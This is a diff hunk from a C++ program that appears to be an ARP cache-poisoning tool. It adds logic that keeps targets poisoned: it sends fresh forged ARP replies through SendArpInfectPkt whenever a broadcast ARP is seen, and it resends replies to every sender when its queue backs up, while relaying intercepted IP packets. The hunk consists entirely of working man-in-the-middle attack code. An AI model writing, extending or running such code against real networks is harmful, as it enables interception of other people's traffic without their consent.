@@ -217,24 +217,42 @@ bool IpPacketRelay(pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> 
                     if(__recv_packet->arp_.sip() == ip2ip.first && __recv_packet->arp_.tip() == ip2ip.second){
                         Arp_queue.push( ip2ip );
                     }
+                    if(__recv_packet->eth_.dmac().isBroadcast()){
+                        // if broadcast... target's arp talbe be changed.
+                        std::pair<Ip,Ip> _ip2ip(ip2ip.second, ip2ip.first);
+                        Arp_queue.push(_ip2ip);
+                    }
                 }          
             }   
         }
 
     }, handle, Send2Tar, ArpTable);
     
-    std::thread t2([](pcap_t* handle, std::map<Ip, Mac> ArpTable){
+    std::thread t2([](pcap_t* handle, std::map<Ip, Ip> Send2Tar, std::map<Ip, Mac> ArpTable){
         while (true)
         {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            if(Arp_queue.size() > 5){
+                std::queue<std::pair<Ip,Ip>> empty;
+                std::swap(Arp_queue, empty);
+
+                std::this_thread::sleep_for(std::chrono::seconds(1));
+                for (auto& ip2ip : Send2Tar)
+                {
+                    SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
+                    std::cout << "[Clear Arp Queue] Send Arp Reply to " << std::string(ip2ip.first) << "\n";
+                }
+
+            }
             if(Arp_queue.empty() == false){ // mutex? semaphore?
                 std::pair<Ip,Ip> ip2ip = Arp_queue.front();
 
                 SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
                 std::cout << "[!] Send Arp Reply to " << std::string(ip2ip.first) << "\n";
                 Arp_queue.pop();
-            } 
+            }
         }
-    }, handle, ArpTable);
+    }, handle, Send2Tar, ArpTable);
     
     
     t1.join();
